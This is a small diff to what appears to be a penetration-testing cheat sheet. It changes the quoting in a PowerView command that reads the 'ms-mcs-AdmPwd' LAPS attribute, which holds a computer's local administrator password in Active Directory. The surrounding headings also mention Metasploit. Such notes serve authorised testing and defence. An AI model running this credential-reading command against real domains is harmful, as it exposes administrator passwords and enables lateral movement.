@@ -28,7 +28,7 @@ Find-LAPSDelegatedGroups
 
 ## powerview get laps password
 ```powershell
-Get-DomainObject <computer> -Properties "ms-mcs-AdmPwd",name
+Get-DomainObject <computer> -Properties 'ms-mcs-AdmPwd',name
 ```
 
 ## metasploit get laps password
